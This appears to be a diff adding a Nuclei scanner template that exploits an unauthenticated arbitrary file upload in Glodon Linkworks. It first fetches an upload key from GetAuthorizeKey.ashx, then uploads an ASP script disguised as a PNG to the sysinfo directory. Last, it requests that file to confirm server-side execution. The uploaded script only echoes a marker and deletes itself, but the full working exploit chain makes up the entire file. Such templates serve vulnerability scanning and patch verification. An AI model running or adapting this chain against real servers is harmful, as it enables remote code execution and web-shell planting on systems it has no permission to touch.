@@ -1,0 +1,88 @@
+id: guanglianda-bypasslogin-fileupload
+info:
+  name: 广联达 Linkworks bypasslogin 接口 - 任意文件上传漏洞
+  author: 2husky
+  severity: high
+  reference:
+  - https://zsxq.com/
+  metadata:
+    verified: true
+    max-request: 3
+    vuln-id: CT-845402
+    vendor: glodon
+    product: linkworks
+  tags: file-upload,vuln,glodon
+variables:
+  s1: '{{to_lower(rand_text_alpha(8))}}'
+  s2: '{{to_lower(rand_text_alpha(8))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2) && http(3)
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/Services/FileService/UserFiles/GetAuthorizeKey.ashx'
+  redirects: false
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: destDir=./sysinfo/&destFilename={{s1}}.asp
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, "fileExists:")'
+    internal: true
+  extractors:
+  - type: regex
+    name: key
+    part: body
+    group: 1
+    regex:
+    - 'key:\"(.+?)\"}'
+    internal: true
+- method: POST
+  path:
+  - '{{BaseURL}}/Services/FileService/UserFiles/UserFilesUpload.ashx'
+  redirects: false
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  body: |
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="destDir"
+
+    ./sysinfo/
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="destFilename"
+
+    {{s1}}.asp
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="key"
+
+    {{key}}
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="successUrl"
+
+    ~\sysinfo
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="overWrite"
+
+    true
+    ------WebKitFormBoundary{{rboundary}}
+    Content-Disposition: form-data; name="FileData"; filename="{{s1}}.asp"
+    Content-Type: image/png
+
+    <% response.write("{{s2}}")
+    set myfso=server.CreateObject("scripting.filesystemobject")
+    myfso.DeleteFile(server.MapPath(request.ServerVariables("Path_Info")))
+    %>12
+    ------WebKitFormBoundary{{rboundary}}--
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 302 && contains(body, "success")'
+- method: GET
+  path:
+  - '{{BaseURL}}/UserFiles/sysinfo/{{s1}}.asp'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, s2)'
